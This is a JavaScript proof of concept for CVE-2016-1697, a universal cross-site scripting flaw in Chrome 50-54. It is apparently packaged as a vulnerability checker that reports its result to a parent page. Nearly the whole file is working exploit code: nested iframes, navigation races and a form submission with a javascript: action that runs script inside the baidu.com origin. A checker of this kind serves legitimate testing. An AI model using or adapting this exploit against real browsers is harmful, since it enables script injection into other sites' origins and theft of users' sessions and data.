<script>
    
    VULN_NAME='CVE-2016-1697';
    VULN_VERSION=['Chrome 50-Chrome 54'];
    
    function post_result(check_state) {
        var parentwin = window.parent;
        var post_result_json={};
        post_result_json.vuln_name=VULN_NAME;
        post_result_json.vuln_version=VULN_VERSION;
        post_result_json.vuln_valid_state=check_state;
        
        console.log(post_result_json);
        parentwin.postMessage(post_result_json,'*');
    }
    
    var check_is_valid_state=false;
    
    window.onmessage=function(message) {
        if ('boolean'==typeof message.data) {
            check_is_valid_state=message.data;
            
            post_result(check_is_valid_state);
        }
    }
    
    function check_is_valid() {
        if (!check_is_valid_state)
            post_result(check_is_valid_state);
    }
    
    
    
    document.write(0);
    var i = document.body.appendChild(document.createElement('iframe'));
    i.contentDocument.open();
    var i1 = i.contentDocument.appendChild(document.createElement('iframe'));
    var d = i1.contentDocument;
    var i11 = d.documentElement.appendChild(d.createElement('iframe'));

    onload = function() {
      var a = d.createElement('a');
      a.href = 'data:text/xml,';
      a.click();
    }

    i.contentWindow.onmessage = window.onmessage;  //  ReDirect Trance Result ..

    i.contentWindow.onload = function() {
      var a = d.createElement('a');
      a.href = 'data:text/xml,';
      a.click();
      document.close();
    }

    i11.contentWindow.onunload = function() {
      stop();
      setTimeout(g, 1);
    }

    function g() {
      i1.onload = function() {
        var x = d.createElement('form');
        
        x.action = 'javascript:function post_result(){var parentwin=window.parent;parentwin.postMessage(true,"*")};if ("www.baidu.com"==document.domain) post_result(true);';  //  Check Valid State 
          
        x.submit();
      }
      i1.src = 'https://www.baidu.com';
    }

    function f() {
      var a = d.createElement('a');
      a.href = 'data:text/xml,';
      a.click();
      i.contentDocument.close();
      a = d.createElement('a');
      a.href = 'http://www.apple.com';
      a.click();
    }

    setTimeout(f, 100);
    
    setTimeout('check_is_valid()', 10000);
</script>